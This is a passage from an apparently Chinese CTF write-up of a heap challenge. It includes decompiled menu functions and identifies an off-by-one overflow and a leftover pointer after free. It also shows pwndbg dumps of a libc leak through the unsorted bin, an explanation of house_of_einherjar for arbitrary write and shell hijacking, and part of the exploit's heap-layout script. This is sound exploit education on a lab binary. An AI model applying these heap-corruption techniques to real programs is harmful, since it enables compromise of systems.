class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">create_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  trr *v0; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+4h] [rbp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">9</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;heaparray + i) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(&amp;heaparray + i) = (trr *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !*(&amp;heaparray + i) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of Heap : &quot;</span>);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">      size = atoi(buf);</span><br><span class=\"line\">      v0 = *(&amp;heaparray + i);</span><br><span class=\"line\">      v0-&gt;ptr = (__int64)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !(*(&amp;heaparray + i))-&gt;ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Allocate Error&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      (*(&amp;heaparray + i))-&gt;size = size;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap:&quot;</span>);</span><br><span class=\"line\">      read_input((*(&amp;heaparray + i))-&gt;ptr, size);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SuccessFul&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> __fastcall <span class=\"title function_\">read_input</span><span class=\"params\">(<span class=\"type\">void</span> *a1, <span class=\"type\">size_t</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = read(<span class=\"number\">0</span>, a1, a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)result &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Error&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看 creat 的时候，首先可以看看是否存在溢出的可能。但是这道题这里没有什么溢出的可能。但是可以修改堆块的 prev_size</p>\n<h3 id=\"edit\"><a class=\"markdownIt-Anchor\" href=\"#edit\">#</a> Edit</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">edit_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;heaparray + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content of heap : &quot;</span>);</span><br><span class=\"line\">    read_input((<span class=\"type\">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr, (*(&amp;heaparray + v1))-&gt;size + <span class=\"string\">&#x27;\\x01&#x27;</span>);<span class=\"comment\">// 1字节溢出</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是当我们看到 edit 函数的时候，但到了这里有一个非常显眼的 1 字节溢出，所以后续考虑 OFF_BY_ONE 攻击手法与其他手法配合使用</p>\n<h3 id=\"show\"><a class=\"markdownIt-Anchor\" href=\"#show\">#</a> Show</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">show_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;heaparray + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size : %ld\\nContent : %s\\n&quot;</span>, (*(&amp;heaparray + v1))-&gt;size, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br></pre></td></tr></table></figure>\n<p>show 这里也没有什么特殊的，</p>\n<h3 id=\"free\"><a class=\"markdownIt-Anchor\" href=\"#free\">#</a> Free</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">delete_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;heaparray + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*(&amp;heaparray + v1));</span><br><span class=\"line\">    *(&amp;heaparray + v1) = <span class=\"number\">0LL</span>;                   <span class=\"comment\">// 只清空了heaparray,结构体中指针未清空，</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>free 模块这里，其实仔细看，会发现虽然 free 后将 bss 段上的指针清空了，但是结构体的 ptr 成员并没有清空，但是这了 uaf 并不是很容易利用。因为 bss 段上的指针被清空了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">trr</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> size; \t\t<span class=\"comment\">//记录大小</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> * ptr;\t\t\t<span class=\"comment\">//储存我们输入Content</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ss:<span class=\"number\">00000000006020</span>A0 ; trr *heaparray</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A0 heaparray       dq ?                    ; DATA XREF: create_heap+<span class=\"number\">31</span>↑r</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A0                                         ; create_heap+<span class=\"number\">54</span>↑w ...</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A8                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A9                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AA                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AB                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AC                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AD                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AE                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AF                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>0                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>1                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>2                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>3                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>4                 db    ? ;</span><br></pre></td></tr></table></figure>\n<p>题目大概就是这样，初步我们看到了一个 off_by_one 漏洞，以及一个不是很理想 UAF</p>\n<h2 id=\"pwning\"><a class=\"markdownIt-Anchor\" href=\"#pwning\">#</a> pwning</h2>\n<h3 id=\"开始前的准备\"><a class=\"markdownIt-Anchor\" href=\"#开始前的准备\">#</a> 开始前的准备</h3>\n<p>首先这个题并没有后门，那么我们就要去泄露 libc 的基地址。然后再去考虑其他的</p>\n<h3 id=\"leak-the-libc_base\"><a class=\"markdownIt-Anchor\" href=\"#leak-the-libc_base\">#</a> leak the libc_base</h3>\n<p>这里我们关注到的是在申请到堆块之后，并没有对其进行初始化，只是对储存有 content 的堆块检查读入的数据是否为 0 字节，也就是说我们至少读入一个字节，不过因为使用的 read 函数，所以不会自动的添加换行符，但这无所谓，这里将一个比较常用的 unsortedbins 泄露基地址 main_arena. 当一个较大的 chunk 超过了 fastbins 的范围，就会被加入 unsortedbins 双链表中。其实，第一个堆块的 fd,bk 指针会指向 main_arena+x,。当我们再次申请到这个 chunk 时，其 fd,bk 指针不会被清空，只是会被我们输入的 content 覆盖。但是我们输入的 content 只检查了至少输入一个字节，而且允许我们输入’\\x00’空字符。</p>\n<p>那么这里就有了完整的泄露的思路</p>\n<p>申请一个 0x80 的堆块（实际得到的 0x90）, 然后将其释放。因为这个是一个嵌套的堆块，delete 的时候先释放 content, 再释放 struct</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x2368000</span>\t\t\t<span class=\"comment\">//struct_trr</span></span><br><span class=\"line\"><span class=\"number\">0x2368000</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000021</span></span><br><span class=\"line\"><span class=\"number\">0x2368010</span>:\t<span class=\"number\">0x0000000000000080</span>\t<span class=\"number\">0x0000000002368030</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x2368020</span>\t\t\t<span class=\"comment\">//content</span></span><br><span class=\"line\"><span class=\"number\">0x2368020</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x2368030</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>free 后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">fastbins</span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x2368000</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x30</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x40</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x50</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x60</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x70</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x80</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: <span class=\"number\">0x2368020</span> —▸ <span class=\"number\">0x7fb1f48beb78</span> (main_arena+<span class=\"number\">88</span>) ◂— <span class=\"number\">0x2368020</span></span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\"></span><br><span class=\"line\">##########################################################<span class=\"meta\">#    </span></span><br><span class=\"line\"><span class=\"meta\">pwndbg&gt; x/4gx 0x2368020</span></span><br><span class=\"line\"><span class=\"number\">0x2368020</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x2368030</span>:\t<span class=\"number\">0x00007fb1f48beb78</span>\t<span class=\"number\">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>\n<p>重新申请后，只要控制 conten 的长度不会将 bk 指针释放释放，同时字符串可以将 bk 链接起来，就可以再 show 的时候，将 bk 泄露出来</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>gx <span class=\"number\">0x2368010</span></span><br><span class=\"line\"><span class=\"number\">0x2368010</span>:\t<span class=\"number\">0x0000000000000080</span>\t<span class=\"number\">0x0000000002368030</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x0000000002368030</span><span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x2368020</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x2368030</span>:\t<span class=\"number\">0x6161616161616161</span>\t<span class=\"number\">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"关键point\"><a class=\"markdownIt-Anchor\" href=\"#关键point\">#</a> 关键 point</h3>\n<p>这个题的关键难点在于适合实现 shell，劫持 malloc_hook 也好，覆盖 got 表也好都需要实现任意地址写，这里我们用到一个 unlink 手法 house_of_einherjar。这项技术使用的前提就是存在溢出，至少 1 字节，来修改一个 allocated_chunk 的 prev_size 和 prev_inuse。</p>\n<blockquote>\n<p>house_of_einherjar======&gt;<br>\n 而此手法有几个点值得关注，1，我们可以认为的修改一个 allocted_chunk 的 prev_size, 以及 prev_inuse. 我们需要构造一个 fake_chunk (一个方面泄露栈地址，在栈上伪造一个 chunk，这个方法配合修改 eip 使用，但是因为栈的内容会发生变化，就要进一步思考控制具体到哪里。其二可以在 bss 段上伪造 chunk，达到修改全局变量的目的。其三可以控制到 got 表，修改 got 表。其四控制到 malloc_hook,free_hook,reallok_hook, 使用 onegadget)。 prev_size = victim_chunk_size - aimed_address。 同时我们还需要利用 victim 的前一个 allocted chunk A， 申请的大小不要使 16 位对齐，0x10*k+8, 这样就可以在申请到 victim B 后，prev_size 允许被 A 使用，同时可以利用 off_by_one 技术 NULL 溢出修改 B 的 prev_inuse（将其改为 0），这样 unlink 通过 chunk_addr_B - prev_size 定位到 fake_chunk, 因为 bss 以及栈地址通常会比 heap 地址大，所以 prev_size 传入的是一个负数，但是因为 prev_size 是无符号数，发生溢出，就这样虽然我们 free B，向前 unlink，结果其实把后面的 fakechunk 合并到一起，而且新的堆头地址是 fakechunk。注意构造 fake_chunk 时，要保证其可以 pass unlink 的检查</p>\n<p>p-&gt;fd-&gt;bk=p,p-&gt;bk-&gt;fd=p,p-&gt;prev_size = p-&gt;bk-&gt;size，p-&gt;fd-&gt;prev_size = p-&gt;size, 最简单的就是将 fd、bk 指向自己。unlink 时，不会改变被合并的堆块的数据，只会更改新的堆头数据，此时 fakechunk 就是新的 topchunk</p>\n</blockquote>\n<p>我们在对快中伪造一个个 fakechunk，然后修改 victim_chunk, 这里要注意的是，victim_chunk 必须与 topchunk 相邻，才可以实现 fake_top_chunk. 这里细解释下为什么这样做，这样做的目的是，在 unlink 前，我们已经申请出一些堆块，比如存在一个结构体堆块，而这个堆块的地址比 fakechunk 大，那么 unlink 后，这个堆块的数据不变，但是 topchunk 的位置在这个堆块之前，我们就可以再次利用到这个堆块，换言之，我们申请一个很大堆块，那么刚刚所说 结构体会被包含，当我们编辑这个大堆块的内容时，控制长度就可以将其覆盖，而我们有知道结构体里面还有一个 content 的指针，如果我们把这个覆盖这个指针，就实现了任意地址写。</p>\n<p>这里要解决几个问题，每次创建的时候会申请出来两个堆块，一个大小 0x20, 一个为 size。为了溢出，我们就要考虑堆块的布局，这里我提供一种</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;\\x00&quot;</span>)\t\t<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)\t\t<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)\t\t<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>,<span class=\"string\">&#x27;ssss&#x27;</span>)\t\t<span class=\"comment\">#3</span></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<p>0 用来 leak libc_base, 我们重复利用，1 我们构造了两个大小相等的堆块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x21</span>:struct0---&gt; struct1 ---&gt;content1 ---&gt;struct2 ---&gt;struct3 ---&gt;<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0x61</span>:conten2 ---&gt;<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">unsortedbins: content0 ---&gt;content3 ---&gt;main_arena\t\t\t<span class=\"comment\">//(FIFO)</span></span><br><span class=\"line\">    </span><br><span class=\"line\"> fastbins</span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x2368000</span> —▸ <span class=\"number\">0x23680b0</span> —▸ <span class=\"number\">0x23680d0</span> —▸ <span class=\"number\">0x23680f0</span> —▸ <span class=\"number\">0x2368170</span> ◂— ...</span><br><span class=\"line\"><span class=\"number\">0x30</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x40</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x50</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x60</span>: <span class=\"number\">0x2368110</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x70</span>: <span class=\"number\">0x0</span></span><br><span 